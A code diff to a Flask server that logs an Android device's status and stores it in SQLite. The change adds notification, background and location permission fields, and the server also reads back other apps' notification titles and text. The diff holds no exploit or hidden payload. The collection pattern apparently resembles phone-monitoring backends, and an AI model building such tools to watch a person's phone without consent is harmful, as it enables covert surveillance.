@@ -5,8 +5,7 @@ from flask import Flask, request, jsonify, render_template
 app = Flask(__name__)
 logging.basicConfig(filename='server.log', level=logging.INFO)
 
-# Yeni veritabanı dosyası (Eski yapıyı geçersiz kılar)
-DB_NAME = 'database_v2.db'
+DB_NAME = 'database_v3.db'
 
 def init_db():
     conn = sqlite3.connect(DB_NAME)
@@ -19,6 +18,9 @@ def init_db():
             battery TEXT,
             android_version TEXT,
             connection_type TEXT,
+            notif_permission TEXT,
+            bg_permission TEXT,
+            location_permission TEXT,
             timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
         )
     ''')
@@ -49,13 +51,16 @@ def device_status():
         battery = data.get('battery', '%85')
         android_version = data.get('android_version', '13')
         connection_type = data.get('connection_type', 'Wi-Fi')
+        notif_permission = data.get('notif_permission', 'Aktif')
+        bg_permission = data.get('bg_permission', 'Devre Dışı')
+        location_permission = data.get('location_permission', 'Izin Verildi')
 
         conn = sqlite3.connect(DB_NAME)
         cursor = conn.cursor()
         cursor.execute('''
-            INSERT INTO devices (device_id, status, battery, android_version, connection_type)
-            VALUES (?, ?, ?, ?, ?)
-        ''', (device_id, status, battery, android_version, connection_type))
+            INSERT INTO devices (device_id, status, battery, android_version, connection_type, notif_permission, bg_permission, location_permission)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (device_id, status, battery, android_version, connection_type, notif_permission, bg_permission, location_permission))
         conn.commit()
         conn.close()
         return jsonify({"status": "success", "message": "Status received"}), 200
@@ -85,7 +90,7 @@ def get_data():
     conn = sqlite3.connect(DB_NAME)
     cursor = conn.cursor()
 
-    cursor.execute('SELECT device_id, status, battery, android_version, connection_type, timestamp FROM devices ORDER BY id DESC LIMIT 1')
+    cursor.execute('SELECT device_id, status, battery, android_version, connection_type, notif_permission, bg_permission, location_permission, timestamp FROM devices ORDER BY id DESC LIMIT 1')
     row = cursor.fetchone()
     
     device_data = {}
@@ -96,7 +101,10 @@ def get_data():
             'battery': row[2],
             'android_version': row[3],
             'connection_type': row[4],
-            'timestamp': row[5]
+            'notif_permission': row[5],
+            'bg_permission': row[6],
+            'location_permission': row[7],
+            'timestamp': row[8]
         }
 
     cursor.execute('SELECT package_name, title, text, timestamp FROM notifications ORDER BY id DESC LIMIT 20')
